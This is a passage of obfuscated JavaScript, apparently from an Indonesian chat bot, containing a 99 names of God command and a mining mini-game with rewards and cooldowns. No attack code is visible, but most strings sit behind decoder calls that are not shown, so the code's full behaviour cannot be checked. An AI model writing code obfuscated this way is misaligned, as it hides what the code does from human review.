b7)+_0x1c1996(0x99f)+'gMemuliaka'+_0x1c1996(0x1fd1)+_0x1c1996(0x1436),'translation_en':_0x1ce978['EmAKT']},{'index':'25','latin':_0x1ce978['aFtiN'],'arabic':_0x1c1996(0x29b9),'translation_id':_0x1ce978['WLjuk'],'translation_en':_0x1ce978['DTFTD']},{'index':'26','latin':_0x1ce978['HDVaO'],'arabic':_0x1c1996(0x148b),'translation_id':'Yang\x20Memil'+_0x1c1996(0x18b7)+_0x1c1996(0xafe)+_0x1c1996(0x1a3c)+'r','translation_en':_0x1c1996(0x2a13)+_0x1c1996(0x1c44)},{'index':'27','latin':_0x1ce978[_0x1c1996(0x2b47)],'arabic':_0x1ce978['yhzBC'],'translation_id':_0x1ce978[_0x1c1996(0x1c65)],'translation_en':_0x1ce978['XKLzG']},{'index':'28','latin':_0x1c1996(0x1674),'arabic':_0x1ce978[_0x1c1996(0x21cf)],'translation_id':_0x1ce978[_0x1c1996(0x2790)],'translation_en':_0x1ce978[_0x1c1996(0x1c8c)]},{'index':'29','latin':_0x1ce978[_0x1c1996(0x2c6c)],'arabic':_0x1ce978[_0x1c1996(0x1857)],'translation_id':_0x1ce978[_0x1c1996(0x25ac)],'translation_en':_0x1ce978[_0x1c1996(0x1f36)]},{'index':'30','latin':_0x1ce978[_0x1c1996(0x187)],'arabic':_0x1ce978[_0x1c1996(0x26a5)],'translation_id':_0x1c1996(0x28d2)+_0x1c1996(0x18b7)+_0x1c1996(0xafe)+_0x1c1996(0x1f1d),'translation_en':_0x1ce978[_0x1c1996(0x195c)]},{'index':'31','latin':_0x1c1996(0x17da),'arabic':_0x1ce978[_0x1c1996(0x28b3)],'translation_id':_0x1ce978[_0x1c1996(0x20e5)],'translation_en':'The\x20All\x20Aw'+'are'},{'index':'32','latin':_0x1ce978['morYZ'],'arabic':_0x1ce978[_0x1c1996(0x1dd9)],'translation_id':_0x1ce978[_0x1c1996(0x71b)],'translation_en':_0x1ce978[_0x1c1996(0xbae)]},{'index':'33','latin':_0x1ce978[_0x1c1996(0x1b45)],'arabic':_0x1ce978[_0x1c1996(0x1289)],'translation_id':_0x1ce978[_0x1c1996(0x258d)],'translation_en':_0x1ce978['pUbvk']},{'index':'34','latin':_0x1ce978[_0x1c1996(0x1245)],'arabic':_0x1c1996(0x2e98),'translation_id':_0x1ce978[_0x1c1996(0x7a8)],'translation_en':'The\x20All\x20Fo'+_0x1c1996(0x196)},{'index':'35','latin':_0x1c1996(0x19e1),'arabic':'الشَّكُورُ','translation_id':_0x1ce978[_0x1c1996(0x63f)],'translation_en':_0x1ce978['LxQct']},{'index':'36','latin':_0x1ce978[_0x1c1996(0x167f)],'arabic':_0x1ce978['tCvky'],'translation_id':_0x1c1996(0x28d2)+_0x1c1996(0x18b7)+_0x1c1996(0xafe)+'a\x20Tinggi','translation_en':_0x1ce978[_0x1c1996(0x2db1)]},{'index':'37','latin':_0x1ce978[_0x1c1996(0x2f5)],'arabic':_0x1c1996(0x170),'translation_id':_0x1ce978[_0x1c1996(0x20f2)],'translation_en':_0x1ce978[_0x1c1996(0x1a1c)]},{'index':'38','latin':_0x1ce978[_0x1c1996(0x445)],'arabic':_0x1ce978[_0x1c1996(0xe5e)],'translation_id':_0x1ce978[_0x1c1996(0x2eaf)],'translation_en':_0x1c1996(0x830)+_0x1c1996(0xce7)},{'index':'39','latin':'Al\x20Muqiit','arabic':_0x1ce978['RQDkR'],'translation_id':_0x1ce978[_0x1c1996(0x122e)],'translation_en':_0x1ce978[_0x1c1996(0x11be)]},{'index':'40','latin':_0x1ce978['mzvvN'],'arabic':_0x1ce978['Zcoqy'],'translation_id':_0x1ce978[_0x1c1996(0x2027)],'translation_en':_0x1ce978[_0x1c1996(0x2c8d)]},{'index':'41','latin':_0x1ce978[_0x1c1996(0xe84)],'arabic':_0x1ce978['kFlhg'],'translation_id':_0x1ce978[_0x1c1996(0x2348)],'translation_en':'The\x20Majest'+'ic'},{'index':'42','latin':_0x1ce978[_0x1c1996(0x5b3)],'arabic':_0x1ce978[_0x1c1996(0x264c)],'translation_id':_0x1ce978['oYAQc'],'translation_en':_0x1ce978[_0x1c1996(0x14cb)]},{'index':'43','latin':_0x1ce978[_0x1c1996(0x2a06)],'arabic':_0x1ce978[_0x1c1996(0x1989)],'translation_id':_0x1ce978[_0x1c1996(0x5d0)],'translation_en':_0x1ce978[_0x1c1996(0x1760)]},{'index':'44','latin':_0x1ce978[_0x1c1996(0xd48)],'arabic':_0x1c1996(0x2afe),'translation_id':_0x1ce978[_0x1c1996(0x2836)],'translation_en':_0x1ce978[_0x1c1996(0x1be1)]},{'index':'45','latin':_0x1ce978[_0x1c1996(0x1b38)],'arabic':_0x1ce978[_0x1c1996(0x11a0)],'translation_id':_0x1c1996(0x28d2)+'iki\x20Mutlak'+_0x1c1996(0xafe)+_0x1c1996(0xb1e),'translation_en':_0x1ce978[_0x1c1996(0x1d6c)]},{'index':'46','latin':_0x1ce978['CZdBc'],'arabic':_0x1ce978[_0x1c1996(0x13b0)],'translation_id':_0x1ce978[_0x1c1996(0x157f)],'translation_en':_0x1c1996(0xac9)},{'index':'47','latin':_0x1c1996(0x129),'arabic':_0x1ce978[_0x1c1996(0x2ecf)],'translation_id':_0x1ce978[_0x1c1996(0x2ba5)],'translation_en':_0x1ce978[_0x1c1996(0x1c8b)]},{'index':'48','latin':_0x1ce978[_0x1c1996(0x12b1)],'arabic':_0x1ce978[_0x1c1996(0x2c76)],'translation_id':_0x1ce978[_0x1c1996(0x2348)],'translation_en':_0x1ce978[_0x1c1996(0x1dac)]},{'index':'49','latin':_0x1ce978['KpjiW'],'arabic':_0x1ce978[_0x1c1996(0x19c9)],'translation_id':_0x1ce978[_0x1c1996(0x18c6)],'translation_en':_0x1c1996(0x2aaa)+_0x1c1996(0x17c9)+'ad'},{'index':'50','latin':_0x1ce978['wqedN'],'arabic':_0x1ce978['VHiuC'],'translation_id':_0x1ce978['ifnXH'],'translation_en':_0x1ce978[_0x1c1996(0x1b71)]},{'index':'51','latin':_0x1ce978[_0x1c1996(0x1565)],'arabic':_0x1ce978['gxzZB'],'translation_id':_0x1ce978[_0x1c1996(0x19f)],'translation_en':_0x1c1996(0x8c4)+_0x1c1996(0xc50)},{'index':'52','latin':_0x1ce978['gbzaM'],'arabic':_0x1c1996(0x20a1),'translation_id':_0x1c1996(0x28d2)+_0x1c1996(0x18b7)+'\x20sifat\x20Mah'+_0x1c1996(0x2a47)+'ra','translation_en':'The\x20Truste'+_0x1c1996(0x16c8)+'endable'},{'index':'53','latin':_0x1ce978[_0x1c1996(0x12dc)],'arabic':_0x1ce978['ZfIaG'],'translation_id':'Yang\x20Memil'+_0x1c1996(0x18b7)+'\x20sifat\x20Mah'+_0x1c1996(0x1a2e),'translation_en':_0x1ce978[_0x1c1996(0x772)]},{'index':'54','latin':_0x1ce978[_0x1c1996(0x166)],'arabic':_0x1ce978[_0x1c1996(0x1387)],'translation_id':_0x1ce978[_0x1c1996(0x25e)],'translation_en':_0x1ce978[_0x1c1996(0x619)]},{'index':'55','latin':_0x1ce978[_0x1c1996(0x19ee)],'arabic':_0x1c1996(0x12f2),'translation_id':_0x1ce978[_0x1c1996(0x1148)],'translation_en':_0x1ce978['EUckO']},{'index':'56','latin':_0x1ce978['twMRC'],'arabic':_0x1c1996(0x1de4),'translation_id':_0x1ce978[_0x1c1996(0x179d)],'translation_en':_0x1ce978['CXGfG']},{'index':'57','latin':_0x1c1996(0xb5e),'arabic':_0x1ce978['BKsLY'],'translation_id':_0x1ce978[_0x1c1996(0x2040)],'translation_en':_0x1ce978[_0x1c1996(0x1422)]},{'index':'58','latin':_0x1c1996(0x1f05),'arabic':_0x1ce978[_0x1c1996(0x1247)],'translation_id':_0x1ce978[_0x1c1996(0x877)],'translation_en':_0x1ce978[_0x1c1996(0x2884)]},{'index':'59','latin':_0x1ce978[_0x1c1996(0xcb1)],'arabic':_0x1ce978[_0x1c1996(0xb21)],'translation_id':_0x1ce978[_0x1c1996(0x505)],'translation_en':_0x1ce978[_0x1c1996(0x1a58)]},{'index':'60','latin':_0x1ce978['lRzEM'],'arabic':_0x1ce978[_0x1c1996(0x2c4c)],'translation_id':_0x1ce978[_0x1c1996(0x24e6)],'translation_en':_0x1ce978[_0x1c1996(0x9a6)]},{'index':'61','latin':_0x1ce978[_0x1c1996(0x2290)],'arabic':_0x1ce978[_0x1c1996(0x2e11)],'translation_id':_0x1ce978[_0x1c1996(0x1b4f)],'translation_en':_0x1ce978['SypJJ']},{'index':'62','latin':_0x1ce978[_0x1c1996(0x2ae1)],'arabic':_0x1ce978[_0x1c1996(0x16f3)],'translation_id':_0x1ce978[_0x1c1996(0x1a22)],'translation_en':_0x1ce978[_0x1c1996(0x23ec)]},{'index':'63','latin':_0x1ce978['chDBP'],'arabic':_0x1ce978[_0x1c1996(0x1472)],'translation_id':_0x1ce978[_0x1c1996(0x890)],'translation_en':_0x1ce978[_0x1c1996(0x1c4a)]},{'index':'64','latin':_0x1ce978['lemtq'],'arabic':_0x1ce978['lLDYq'],'translation_id':_0x1ce978[_0x1c1996(0x209)],'translation_en':_0x1ce978[_0x1c1996(0xc64)]},{'index':'65','latin':_0x1ce978[_0x1c1996(0x131c)],'arabic':_0x1ce978[_0x1c1996(0x276e)],'translation_id':_0x1ce978[_0x1c1996(0x2348)],'translation_en':_0x1c1996(0x1ab0)+'rious,\x20the'+_0x1c1996(0x1f0d)+'nt'},{'index':'66','latin':_0x1ce978[_0x1c1996(0x1d87)],'arabic':_0x1ce978['XwJkj'],'translation_id':_0x1ce978[_0x1c1996(0x291f)],'translation_en':_0x1c1996(0x1d47)+_0x1c1996(0x8fe)+_0x1c1996(0x21ba)+_0x1c1996(0x1755)+'ity'},{'index':'67','latin':_0x1c1996(0xd1f),'arabic':_0x1ce978[_0x1c1996(0x1a83)],'translation_id':_0x1ce978[_0x1c1996(0x25ad)],'translation_en':'The\x20One,\x20t'+_0x1c1996(0x1c07)+_0x1c1996(0x18f1)+_0x1c1996(0x9aa)+'ble'},{'index':'68','latin':_0x1ce978[_0x1c1996(0x1d95)],'arabic':_0x1ce978[_0x1c1996(0xc24)],'translation_id':_0x1c1996(0x28d2)+_0x1c1996(0x18b7)+_0x1c1996(0xafe)+'aDibutuhka'+_0x1c1996(0x62c)+_0x1c1996(0x231d),'translation_en':_0x1ce978[_0x1c1996(0x1e69)]},{'index':'69','latin':_0x1ce978[_0x1c1996(0x17de)],'arabic':_0x1ce978[_0x1c1996(0x1b11)],'translation_id':_0x1ce978[_0x1c1996(0x223d)],'translation_en':_0x1ce978[_0x1c1996(0x335)]},{'index':'70','latin':'Al\x20Muqtadi'+'r','arabic':_0x1ce978[_0x1c1996(0xcc0)],'translation_id':_0x1ce978[_0x1c1996(0x151a)],'translation_en':_0x1ce978[_0x1c1996(0x2d89)]},{'index':'71','latin':_0x1ce978[_0x1c1996(0x984)],'arabic':_0x1c1996(0x280d)+'مُ','translation_id':_0x1ce978[_0x1c1996(0x42c)],'translation_en':'The\x20Expedi'+_0x1c1996(0x3f1)+_0x1c1996(0x1018)+_0x1c1996(0x2ec3)},{'index':'72','latin':_0x1ce978[_0x1c1996(0x1996)],'arabic':_0x1ce978[_0x1c1996(0x1eca)],'translation_id':_0x1ce978['dUXfN'],'translation_en':_0x1ce978['CFrFx']},{'index':'73','latin':_0x1ce978[_0x1c1996(0xe9f)],'arabic':_0x1ce978['yMWZu'],'translation_id':_0x1ce978['pzZnp'],'translation_en':_0x1ce978[_0x1c1996(0x1266)]},{'index':'74','latin':_0x1ce978[_0x1c1996(0x1a09)],'arabic':_0x1ce978[_0x1c1996(0x16f5)],'translation_id':'Yang\x20Memil'+_0x1c1996(0x18b7)+_0x1c1996(0xafe)+_0x1c1996(0x25c9),'translation_en':_0x1c1996(0x12df)},{'index':'75','latin':_0x1ce978[_0x1c1996(0x2e9a)],'arabic':_0x1ce978[_0x1c1996(0x247a)],'translation_id':_0x1ce978[_0x1c1996(0x22f8)],'translation_en':_0x1c1996(0x2a25)+_0x1c1996(0x1bed)+'l\x20Victorio'+'us'},{'index':'76','latin':_0x1ce978[_0x1c1996(0x1746)],'arabic':_0x1ce978[_0x1c1996(0x186)],'translation_id':_0x1ce978['LkwVN'],'translation_en':_0x1c1996(0x1ea9)+_0x1c1996(0x15a4)+_0x1c1996(0x1d85)+'ng'},{'index':'77','latin':_0x1ce978[_0x1c1996(0x1cd0)],'arabic':_0x1ce978[_0x1c1996(0x2c51)],'translation_id':_0x1ce978[_0x1c1996(0x56c)],'translation_en':_0x1ce978[_0x1c1996(0xb1d)]},{'index':'78','latin':_0x1ce978['qlPYi'],'arabic':_0x1ce978[_0x1c1996(0x12a4)],'translation_id':_0x1ce978['CdPtz'],'translation_en':_0x1ce978['zvIYm']},{'index':'79','latin':_0x1ce978[_0x1c1996(0x199b)],'arabic':_0x1ce978[_0x1c1996(0x14c7)],'translation_id':_0x1ce978['zbCpg'],'translation_en':_0x1ce978[_0x1c1996(0x1dd5)]},{'index':'80','latin':_0x1ce978[_0x1c1996(0x6ce)],'arabic':_0x1c1996(0x7f8),'translation_id':_0x1ce978[_0x1c1996(0x395)],'translation_en':_0x1ce978['iVOwS']},{'index':'81','latin':'Al\x20Muntaqi'+'m','arabic':_0x1ce978[_0x1c1996(0x2ee1)],'translation_id':_0x1ce978['EGoIA'],'translation_en':_0x1ce978['wIQMI']},{'index':'82','latin':_0x1ce978[_0x1c1996(0x1ed9)],'arabic':_0x1c1996(0x26d7),'translation_id':_0x1ce978[_0x1c1996(0x1901)],'translation_en':_0x1ce978[_0x1c1996(0x22eb)]},{'index':'83','latin':'Ar\x20Ra`uuf','arabic':_0x1c1996(0x25e1),'translation_id':_0x1c1996(0x28d2)+_0x1c1996(0x18b7)+_0x1c1996(0xafe)+'a\x20Pengasih','translation_en':_0x1ce978[_0x1c1996(0x1e12)]},{'index':'84','latin':_0x1ce978[_0x1c1996(0xaa4)],'arabic':_0x1ce978[_0x1c1996(0x1e6a)],'translation_id':_0x1ce978[_0x1c1996(0x133a)],'translation_en':_0x1ce978[_0x1c1996(0x1008)]},{'index':'85','latin':_0x1c1996(0x1c98)+_0x1c1996(0x1234)+'am','arabic':_0x1ce978[_0x1c1996(0x2004)],'translation_id':_0x1ce978[_0x1c1996(0x10e2)],'translation_en':_0x1ce978['klOyT']},{'index':'86','latin':_0x1ce978[_0x1c1996(0x932)],'arabic':_0x1ce978[_0x1c1996(0x2ab3)],'translation_id':_0x1c1996(0x28d2)+_0x1c1996(0x18b7)+_0x1c1996(0xafe)+_0x1c1996(0x1ea0),'translation_en':_0x1ce978[_0x1c1996(0x25a6)]},{'index':'87','latin':_0x1ce978['hayWA'],'arabic':'الْجَامِعُ','translation_id':_0x1ce978[_0x1c1996(0x4ff)],'translation_en':_0x1ce978[_0x1c1996(0x167d)]},{'index':'88','latin':_0x1ce978[_0x1c1996(0x16a2)],'arabic':_0x1ce978[_0x1c1996(0x187f)],'translation_id':_0x1ce978['omSDg'],'translation_en':_0x1ce978[_0x1c1996(0x16c5)]},{'index':'89','latin':_0x1c1996(0x2b3c),'arabic':_0x1ce978['skYDH'],'translation_id':_0x1ce978[_0x1c1996(0x353)],'translation_en':_0x1ce978['BJRen']},{'index':'90','latin':_0x1ce978[_0x1c1996(0x1512)],'arabic':_0x1ce978[_0x1c1996(0x2278)],'translation_id':_0x1ce978[_0x1c1996(0x151e)],'translation_en':_0x1c1996(0x14a3)+'lder,\x20the\x20'+_0x1c1996(0x6d1)+_0x1c1996(0x57b)+'er'},{'index':'91','latin':_0x1c1996(0x12e0),'arabic':_0x1ce978[_0x1c1996(0xe6b)],'translation_id':_0x1ce978['sKAkY'],'translation_en':_0x1ce978['HJszF']},{'index':'92','latin':_0x1ce978[_0x1c1996(0x1ae5)],'arabic':_0x1ce978[_0x1c1996(0x12c5)],'translation_id':_0x1c1996(0x28d2)+_0x1c1996(0x18b7)+_0x1c1996(0xafe)+_0x1c1996(0xacf)+_0x1c1996(0x2c6),'translation_en':_0x1ce978[_0x1c1996(0x2e29)]},{'index':'93','latin':_0x1ce978[_0x1c1996(0x2797)],'arabic':'النُّورُ','translation_id':_0x1c1996(0x28d2)+_0x1c1996(0x18b7)+_0x1c1996(0xafe)+'a\x20Bercahay'+_0x1c1996(0x27e6)+'i,\x20Memberi'+_0x1c1996(0xa07),'translation_en':_0x1ce978[_0x1c1996(0x2d2f)]},{'index':'94','latin':_0x1ce978['aEqhZ'],'arabic':_0x1c1996(0x1fc1),'translation_id':_0x1ce978[_0x1c1996(0x1b0e)],'translation_en':_0x1ce978[_0x1c1996(0x1f81)]},{'index':'95','latin':_0x1ce978[_0x1c1996(0x1248)],'arabic':_0x1ce978[_0x1c1996(0x1e21)],'translation_id':_0x1c1996(0x28d2)+_0x1c1996(0x18b7)+_0x1c1996(0xafe)+_0x1c1996(0x7ba),'translation_en':_0x1c1996(0x1e64)+_0x1c1996(0x30d)+_0x1c1996(0x1862)},{'index':'96','latin':_0x1ce978[_0x1c1996(0x2944)],'arabic':_0x1c1996(0xe21),'translation_id':'Yang\x20Memil'+_0x1c1996(0x18b7)+'\x20sifat\x20Mah'+_0x1c1996(0x2246),'translation_en':_0x1ce978[_0x1c1996(0x1166)]},{'index':'97','latin':_0x1c1996(0x2260),'arabic':_0x1ce978[_0x1c1996(0x7f1)],'translation_id':_0x1ce978[_0x1c1996(0xbe0)],'translation_en':_0x1c1996(0x2941)+_0x1c1996(0x1434)+'tor\x20of\x20All'},{'index':'98','latin':_0x1ce978[_0x1c1996(0x2171)],'arabic':'الرَّشِيدُ','translation_id':_0x1ce978[_0x1c1996(0x1ec4)],'translation_en':_0x1ce978[_0x1c1996(0x878)]},{'index':'99','latin':_0x1ce978[_0x1c1996(0x2aca)],'arabic':_0x1ce978[_0x1c1996(0x1c2b)],'translation_id':_0x1c1996(0x28d2)+_0x1c1996(0x18b7)+'\x20sifat\x20Mah'+_0x1c1996(0x19c7),'translation_en':_0x1ce978['dPvZw']}]}};let _0x479287=_0x525e4b[_0x1c1996(0x1cf5)](_0x56922c[_0x1c1996(0x2c57)+'a']),_0x3ee371=_0x3b08a8[_0x1c1996(0x1c34)](_0x479287),_0x4b0769=_0x3ee371['result']['data'][_0x1c1996(0x16e6)]((_0x45c88a,_0xac6ee1)=>_0xac6ee1+0x1+'.\x20'+_0x45c88a['latin']+'\x0a'+_0x45c88a[_0x1c1996(0x1ad0)]+'\x0a'+_0x45c88a['translatio'+'n_id'])[_0x1c1996(0x86e)]('\x0a\x0a');if(_0xdbd782[0x0]){if(_0x37f051[0x0]<0x1)throw'minimal\x201!';if(_0x1ce978['XPjoF'](_0x2b1395[0x0],0x63))throw _0x1c1996(0x430)+'9!';let {index:_0xce2134,latin:_0x5a8884,arabic:_0x5619d1,translation_id:_0x4177fe,translation_en:_0x4e2ba1}=_0x3ee371[_0x1c1996(0x17dd)][_0x1c1996(0x2bb6)]['find'](_0x242bba=>_0x242bba[_0x1c1996(0x629)]==_0x5b799a[0x0]);return _0x8790b6(_0x1c1996(0x16c2)+_0xce2134+'\x0a\x0a'+_0x5a8884+'\x20\x0a'+_0x5619d1+'\x0a'+_0x4177fe+'\x20\x0a'+_0x4e2ba1+_0x1c1996(0x296f));}_0xa3665=_0x1c1996(0xa8e)+_0x1c1996(0x21e5),_0x25be77=_0x1c1996(0x19b7)+_0x1c1996(0xe4d)+_0x1c1996(0xc45)+'hu\x20anhu,\x20R'+_0x1c1996(0x49f)+_0x1c1996(0x43c)+_0x1c1996(0x2131)+_0x1c1996(0x1f08)+_0x1c1996(0x29c4)+'سْعَةً\x20وَت'+_0x1c1996(0x2a35)+'سْمًا،\x20مِا'+'ئَةٌ\x20إِلَّ'+_0x1c1996(0x145d)+'،\x20مَنْ\x20أَح'+_0x1c1996(0x26e5)+'ل\x20الجنة،\x20و'+_0x1c1996(0x253c)+_0x1c1996(0x179f)+'تْرَ\x22\x0a\x0aArt'+_0x1c1996(0x191b)+_0x1c1996(0x11ec)+_0x1c1996(0x2655)+'unyai\x20semb'+_0x1c1996(0x64b)+_0x1c1996(0x1806)+_0x1c1996(0x1842)+_0x1c1996(0x4db)+_0x1c1996(0x773)+_0x1c1996(0x26f8)+'siapa\x20yang'+'\x20menghitun'+'g-hitungny'+_0x1c1996(0x2d42)+_0x1c1996(0x2a17)+_0x1c1996(0x1542)+_0x1c1996(0x1c76)+_0x1c1996(0x9d4)+_0x1c1996(0x1c8),_0x47634c(_0x1ce978['Ezxuo'](_0x1ce978[_0x1c1996(0x1816)](_0x23b0ff,_0x4b0769),_0x30ec66));}};const _0x575cb6=_0x18255b=>{const _0x44d8a1=_0x240d04;if(_0x1ce978[_0x44d8a1(0x2327)]===_0x1ce978[_0x44d8a1(0x2dba)])_0x1f43ea[_0x30698a]&&_0x1ce978[_0x44d8a1(0x17f4)](_0x3cf1bf[_0x44d8a1(0x104e)](),_0x2a0594[_0x31afe2][_0x44d8a1(0x1e3f)])>=0xea60&&(_0x1ce978[_0x44d8a1(0x110d)](_0x157e00,_0x44d8a1(0xb17)+'bis!\x20Jawab'+_0x44d8a1(0x26d4)+_0x15bf1e(_0x342a24)+'*'),delete _0x3f08c0[_0x579d70]);else{const _0x332be0={'health':'❤️','pickaxedurability':'⛏️','exp':'✨','trash':_0x44d8a1(0x2ad8),'string':'🧵','rock':'🪨','iron':'⛓️','gold':'🥇','diamond':'💎','emerald':'🟢','common':'📦','uncommon':'🎁','mythic':'🧿','legendary':'👑'};return _0x332be0[_0x18255b]||'';}},_0x5a4575=(_0x535696={})=>{const _0x311350=_0x240d04;return{'reward':{'exp':0x3e8,'trash':0x65,'string':0x19,'rock':0x1e,'iron':0x19,'diamond':0xa,'emerald':0x4,'common':_0x1ce978[_0x311350(0x26b)](0x2,_0x1ce978[_0x311350(0x1220)](_0x535696[_0x311350(0x2775)]>0x2?0x2:_0x535696[_0x311350(0x2775)],1.2)||0x1),'uncommon':[0x0,0x0,0x0,0x1,0x0][_0x311350(0x17f0)](new Array(0x5-(_0x1ce978[_0x311350(0x220a)](_0x535696['dog'],0x2)&&_0x1ce978[_0x311350(0xc16)](_0x535696[_0x311350(0x2775)],0x6)&&_0x535696['dog']||_0x535696['dog']>0x5&&0x5||0x2))['fill'](0x0)),'mythic':[0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0,0x0][_0x311350(0x17f0)](new Array(0x8-(_0x1ce978[_0x311350(0x27bb)](_0x535696['dog'],0x5)&&_0x535696[_0x311350(0x2775)]<0x8&&_0x535696['dog']||_0x1ce978[_0x311350(0x81c)](_0x535696[_0x311350(0x2775)],0x7)&&0x8||0x3))[_0x311350(0x12bf)](0x0)),'legendary':[0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0,0x0][_0x311350(0x17f0)](new Array(_0x1ce978[_0x311350(0xf5c)](0xa,_0x535696[_0x311350(0x2775)]||0x4))[_0x311350(0x12bf)](0x0)),'gold':[0x0,0x0,0x0,0x0,0x0,0x1,0x0],'diamond':[0x0,0x0,0x0,0x0,0x0,0x0,0x1,0x0][_0x311350(0x17f0)](new Array(0x5-(_0x535696[_0x311350(0x1ae7)]<0x6&&_0x535696[_0x311350(0x1ae7)]||_0x1ce978[_0x311350(0x15fc)](_0x535696['fox'],0x5)&&0x5||0x0))[_0x311350(0x12bf)](0x0))},'lost':{'health':_0x1ce978[_0x311350(0xee9)](0x28,_0x1ce978[_0x311350(0x2a61)](_0x535696[_0x311350(0x2ff)]||0x0,0x4)),'pickaxedurability':0xa}};},_0x554c2a=_0x1ce978[_0x240d04(0x125f)](_0x1ce978[_0x240d04(0xd2a)](0x5,0x3c),0x3e8);try{if(_0x1ce978['wVKBg']('xlVxS',_0x1ce978[_0x240d04(0x1eb8)])){const _0x5ef5c2=await _0x1ce978['CjQCA'](_0x182219),_0x31fef9=_0x5ef5c2[_0xb65b97]=_0x5ef5c2[_0xb65b97]||{'money':0x0,'exp':0x0,'health':0x64,'pickaxe':0x1,'pickaxedurability':0x64,'lastmining':0x0,'dog':0x0,'fox':0x0,'cat':0x0};if(!_0x31fef9||!_0x31fef9[_0x240d04(0x2eea)]||!_0x31fef9[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0xad4)](_0x476bfb,_0x240d04(0x19fe)+_0x240d04(0x23c6)+_0x240d04(0x1813)+'an\x20/daftar'+_0x240d04(0x2cfd)+_0x240d04(0x163d)+_0x240d04(0x2d8a));if(_0x31fef9[_0x240d04(0x2344)])return _0x1ce978[_0x240d04(0x185f)](_0x476bfb,_0x1ce978['IYBbO']);_0x31fef9['health']=_0x31fef9['health']||0x64,_0x31fef9[_0x240d04(0x206b)]=_0x31fef9[_0x240d04(0x206b)]||0x1,_0x31fef9['pickaxedur'+_0x240d04(0xdb1)]=_0x31fef9[_0x240d04(0x109b)+_0x240d04(0xdb1)]||0x64,_0x31fef9[_0x240d04(0x1145)]=_0x31fef9[_0x240d04(0x1145)]||0x0;const _0xc5d8ed=Date['now'](),_0x50e4f2=_0x1ce978[_0x240d04(0x12f6)](_0x554c2a,_0x1ce978[_0x240d04(0x206a)](_0xc5d8ed,_0x31fef9[_0x240d04(0x1145)]));if(_0x1ce978[_0x240d04(0x27d3)](_0x31fef9[_0x240d04(0x38f)],0x50))return _0x1ce978[_0x240d04(0x743)](_0x476bfb,_0x240d04(0x2272)+_0x240d04(0x2e5c)+'0\x20'+_0x1ce978[_0x240d04(0xeed)](_0x575cb6,_0x240d04(0x38f))+(_0x240d04(0x992)+_0x240d04(0x1229)+_0x240d04(0x1cea)+_0x240d04(0x14eb)+_0x240d04(0x10f3)+_0x240d04(0xfbc)+_0x240d04(0x1376)+'i\x20kembali.'));if(_0x1ce978['ibYwC'](_0x31fef9[_0x240d04(0x206b)],0x0)){if(_0x1ce978['HVzld'](_0x240d04(0x1db1),_0x1ce978[_0x240d04(0x2550)]))_0x383cac+=_0x1ce978['iyhPP'](_0x1ce978[_0x240d04(0x64a)](_0x4c715f,this)[_0x240d04(0x1d8c)](),'\x0a');else return _0x1ce978[_0x240d04(0x1d14)](_0x476bfb,_0x240d04(0x23fe)+_0x240d04(0x3b4)+'ickaxe!\x20Be'+'li\x20dulu\x20pa'+_0x240d04(0x241)+'ickaxe*.');}if(_0x1ce978[_0x240d04(0x17ff)](_0x50e4f2,0x0))return _0x476bfb(_0x240d04(0x20db)+'us\x20menungg'+'u\x20'+_0x1ce978['sHlcV'](_0x50e4f2,0x3e8)[_0x240d04(0x22f3)](0x2)+(_0x240d04(0x8ae)+_0x240d04(0x1820)+_0x240d04(0x2b0d)));const _0x5ee8c8=_0x1ce978[_0x240d04(0x1e86)](_0x5a4575,_0x31fef9);let _0x271874=_0x1ce978[_0x240d04(0x1baf)];for(const _0x429b78 in _0x5ee8c8[_0x240d04(0x172d)]){if(_0x1ce978[_0x240d04(0x2db3)](_0x1ce978[_0x240d04(0x1c94)],_0x1ce978[_0x240d04(0x1c94)]))_0x39e848[_0x3c8075]-=_0xc6fb2d,_0x4ef11f=_0x240d04(0x2388)+_0x240d04(0xe35)+_0x240d04(0x3ae)+_0x9ed9d6+'\x20'+_0x1ce978[_0x240d04(0x2b13)](_0x5680d5,_0x23ab25)+'*';else{const _0x4fbfdc=_0x5ee8c8[_0x240d04(0x172d)][_0x429b78]['getRandom']();_0x31fef9[_0x429b78]-=_0x4fbfdc;if(_0x1ce978[_0x240d04(0x22ef)](_0x4fbfdc,0x0))_0x271874+=_0x240d04(0x1d53)+_0x575cb6(_0x429b78)+'\x20*'+_0x429b78+_0x240d04(0x768)+_0x4fbfdc;}}_0x271874+=_0x1ce978[_0x240d04(0x215b)];for(const _0x4a6c0a in _0x5ee8c8['reward']){if('ihVcw'===_0x240d04(0x31a))_0x1ce978['dYsSJ'](_0x37fee7,_0x58b11b,_0x4aef06['length'],_0x1ce978[_0x240d04(0x186b)]);else{const _0x3b9912=_0x5ee8c8[_0x240d04(0x1294)][_0x4a6c0a]['getRandom']();_0x31fef9[_0x4a6c0a]=_0x31fef9[_0x4a6c0a]||0x0,_0x31fef9[_0x4a6c0a]+=_0x3b9912;if(_0x1ce978[_0x240d04(0x63c)](_0x3b9912,0x0))_0x271874+='\x0a+\x20'+_0x1ce978[_0x240d04(0xf57)](_0x575cb6,_0x4a6c0a)+'\x20*'+_0x4a6c0a+_0x240d04(0x768)+_0x3b9912;}}_0x31fef9['lastmining']=_0xc5d8ed,await _0x1ce978[_0x240d04(0x525)](_0x961430,_0x5ef5c2),_0x1ce978[_0x240d04(0x1dc6)](_0x476bfb,_0x271874);}else _0x4f8d41[_0x3e367f]&&_0x1ce978[_0x240d04(0x2a22)](_0x1ce978['BZmWk'](_0x17be08[_0x240d04(0x104e)](),_0x446259[_0xa2f6c3][_0x240d04(0x1e3f)]),0xea60)&&(_0x1ce978[_0x240d04(0x22e0)](_0x757f49,_0x240d04(0xb17)+'bis!\x20Jawab'+'an:\x20*'+_0x1ce978[_0x240d04(0x713)](_0x24c67e,_0x5eeba9)+'*'),delete _0x4800d2[_0x1f6f47]);}catch(_0x5d4529){console[_0x240d04(0x15e)](_0x5d4529),_0x476bfb(_0x1ce978[_0x240d04(0x153d)]);}}break;case _0x1ce978[_0x240d04(0x2d7f)]:{if(_0x1ce978[_0x240d04(0xf78)](_0x1ce978['konmn'],_0x1ce978[_0x240d04(0x216a)]))_0x1ce978[_0x240d04(0x5cd)](_0xb99f8d,_0x35a59b,_0x488746[_0x240d04(0x2b45)],_0x240d04(0x2105));else{const _0x656587=0x1;try{if(_0x1ce978[_0x240d04(0x1687)]===_0x1ce978[_0x240d04(0x1371)])return 